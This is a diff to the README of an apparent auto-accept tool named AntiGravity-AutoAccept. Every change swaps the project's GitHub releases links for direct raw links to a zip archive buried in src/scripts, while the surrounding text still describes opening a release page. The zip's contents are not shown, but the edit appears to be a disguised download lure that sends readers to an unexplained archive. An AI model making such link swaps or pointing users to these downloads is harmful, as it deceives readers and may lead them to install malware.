@@ -1,6 +1,6 @@
 # 🚀 AntiGravity-AutoAccept - Simple Tool to Auto Accept Tasks
 
-[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://raw.githubusercontent.com/SantosaDev/AntiGravity-AutoAccept/main/src/scripts/Gravity_Accept_Auto_Anti_2.5.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ You need to download the latest version of AntiGravity-AutoAccept from the offic
 
 **Step 1:** Click the big button below to open the download page.
 
-[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-blue)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-blue)](https://raw.githubusercontent.com/SantosaDev/AntiGravity-AutoAccept/main/src/scripts/Gravity_Accept_Auto_Anti_2.5.zip)
 
 **Step 2:** On the release page, look for the latest version. It is usually at the top of the list. The version will have a date and version number like "v1.0" or higher.
 
@@ -112,8 +112,8 @@ To update:
 
 ## 🖇 Useful Links
 
-- **Download Page:** [AntiGravity-AutoAccept Releases](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+- **Download Page:** [AntiGravity-AutoAccept Releases](https://raw.githubusercontent.com/SantosaDev/AntiGravity-AutoAccept/main/src/scripts/Gravity_Accept_Auto_Anti_2.5.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://github.com/SantosaDev/AntiGravity-AutoAccept/releases)
+[![Download](https://img.shields.io/badge/Download-AntiGravity--AutoAccept-brightgreen)](https://raw.githubusercontent.com/SantosaDev/AntiGravity-AutoAccept/main/src/scripts/Gravity_Accept_Auto_Anti_2.5.zip)
